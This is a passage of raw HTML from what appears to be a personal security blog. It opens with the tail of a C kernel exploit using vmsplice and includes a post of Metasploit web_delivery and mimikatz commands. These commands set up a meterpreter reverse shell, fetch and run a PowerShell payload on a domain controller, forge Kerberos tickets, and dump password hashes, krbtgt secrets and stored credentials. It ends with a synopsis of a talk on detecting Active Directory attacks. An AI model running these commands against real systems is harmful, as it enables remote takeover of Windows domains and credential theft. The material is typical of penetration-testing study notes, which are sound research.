</span><span class='line'>    if (munmap(map_addr + map_size, PAGE_SIZE) &lt; 0)
</span><span class='line'>        die("munmap", errno);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    if (pipe(pi) &lt; 0) die("pipe", errno);
</span><span class='line'>    close(pi[0]);
</span><span class='line'> 
</span><span class='line'>    iov.iov_base = map_addr;
</span><span class='line'>    iov.iov_len  = ULONG_MAX;
</span><span class='line'> 
</span><span class='line'>    signal(SIGPIPE, exit_code);
</span><span class='line'>    _vmsplice(pi[1], &iov, 1, 0);
</span><span class='line'>    die("vmsplice", errno);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/11/decrypting-nthash/">Decrypting Nthash</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-11T13:19:54+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:19 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content">
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/10/metasploit-web-delivery/">Metasploit: Web_delivery</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-10T09:33:08+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:33 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="http://www.slideshare.net/gentilkiwi/mimikatz-how-to-push-microsoft-to-change-some-little-stuff">mimikatz @ passwords#14</a></li>
<li><a href="http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">Mimikatz 2.0 - Golden Ticket Walkthrough</a></li>
<li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">Abusing Microsoft Kerberos by Alva DUCKWALL &amp; Benjamin DELPY</a></li>
<li><a href="http://www.ietf.org/rfc/rfc4120.txt">Kerberos tickets</a></li>
<li><a href="http://www.ietf.org/rfc/rfc4757.txt">RFC4757</a></li>
<li><a href="http://msdn.microsoft.com/library/cc237917.aspx">Microsoft Specific PAC</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exploit(web_delivery) &gt; set TARGET 2
</span><span class='line'>exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span><span class='line'>exploit(web_delivery) &gt; set LHOST 172.16.3.76
</span><span class='line'>exploit(web_delivery) &gt; set LPORT 8686
</span><span class='line'>exploit(web_delivery) &gt; run
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] [...] Started reverse handler on 172.16.3.76:8686
</span><span class='line'>[*] [...] Using URL: http://0.0.0.0:8080/moKqrqIYh0
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>$ winexe -k DOMAIN //dc01 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>meterpreter &gt; getsystem
</span><span class='line'>meterpreter &gt; getprivs
</span><span class='line'>meterpreter &gt; portfwd ...
</span><span class='line'>
</span><span class='line'>$ python forgeTGT.py ...
</span><span class='line'>$ wine mimikatz.exe "kerberos::clist TGT_... /export" exit
</span><span class='line'>
</span><span class='line'>meterpreter &gt; load kiwi
</span><span class='line'>meterpreter &gt; kerberos_ticket_use /root/git/....DOAMIN.kirbi
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>
</span><span class='line'>c:\&gt; sc \\dc01\ create psh binPath="cmd.exe /c powershell -nop -w hidden -c IEK ((new-object net.webclient).downloadstring('172.16.3.76:8080/moKqrqIYh0'))"
</span><span class='line'>c:\&gt; sc \\dc01\ start psh
</span><span class='line'>c:\&gt; sc \\dc01\ delete psh
</span><span class='line'>c:\&gt; exit
</span><span class='line'>
</span><span class='line'>meterpreter &gt; background
</span><span class='line'>meterpreter &gt; sessions -i ...
</span><span class='line'>meterpreter &gt; run post/windows/gather/hashdump
</span><span class='line'>meterpreter &gt; run post/windows/gather/credentials/credential_collector</span></code></pre></td></tr></table></div></figure>


<p>mimikatz</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mimikatz # sekurlsa::logonpasswords
</span><span class='line'>mimikatz # sekurlsa::ekeys
</span><span class='line'>mimikatz # lsadump::lsa /inject /name:krbtgt
</span><span class='line'>mimikatz # lsadump::lsa /inject /name:Administrator
</span><span class='line'>mimikatz # sekurlsa::pth /user:Administrator /domain:babo.local /ntlm:cc36...
</span><span class='line'>mimikatz # kerberos::list /export
</span><span class='line'>mimikatz # kerberos::ptt ticket.kirbi
</span><span class='line'>mimikatz # sekurlsa::tickets /export</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Kerberos::Overpass-the-hash</li>
<li><a href="http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx">Kerberos::Pass-the-ticket</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/10/red-vs-blue-modern-active-directory-attacks/">Red vs. Blue: Modern Active Directory Attacks</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-10T09:08:51+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:08 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>From shakacon.org</p>

<p>Name: Sean Metcalf</p>

<p>Synopsis: While Kerberos &ldquo;Golden Tickets&rdquo; and &ldquo;Silver Tickets&rdquo; received a lot of press in the second half of 2014, there hasn&rsquo;t been much detail provided on how exactly they work, why they are successful, and how to mitigate them (other than: &ldquo;don&rsquo;t get pwned&rdquo;). Golden Tickets are the ultimate method for persistent, forever AD admin rights to a network since they are valid Kerberos tickets and can&rsquo;t be detected, right?</p>

<p>This talk covers the latest AD attack vectors and describes how to detect Golden Ticket usage. Provided are key indicators that can detect Kerberos attacks on your network, including Golden tickets, Silver tickets &amp; MS14-068 exploitation, as well as methods to identify, mitigate, and prevent common Active Directory attack vectors. When forged Kerberos tickets are used in AD, there are some interesting artifacts that can be identified. Yes, despite what you may have read on the internet, there are ways to detect Golden &amp; Silver Ticket usage!</p>

<p>Some of the topics covered:</p>

<ul>
<li>How attackers go fro mzero to (Domain) Admin</li>
<li>MS14-068: the vulnerability, the exploit, and the danger</li>
<li>&ldquo;SPN Scanning&rdquo; with PowerShell to identify potential targets without network scans (SQL, Exchange, FIM, webservers, etc)</li>
<li>Exploiting weak service account passwords as a regular AD user</li>
<li>Mimikatz, the attacker&rsquo;s multi-tool</li>
<li>Using Silver Tickets for stealthy persistence that won&rsquo;t be detected (until now)</li>
<li>Identifying forged Kerberos tickets (Golden &amp; Silver Tickets) on your network</li>
<li>Detecting offensive PowerShell tools like Invoke-Mimikatz</li>
<li>Active Directory attack mitigation</li>
</ul>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/4">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/2">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/01/13/android-hackers-handbook/">Android Hacker's Handbook</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/cve-2013-2094-perf-swevent-enabled-revisited/">CVE-2013-2094: Perf_swevent_enabled Revisited</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
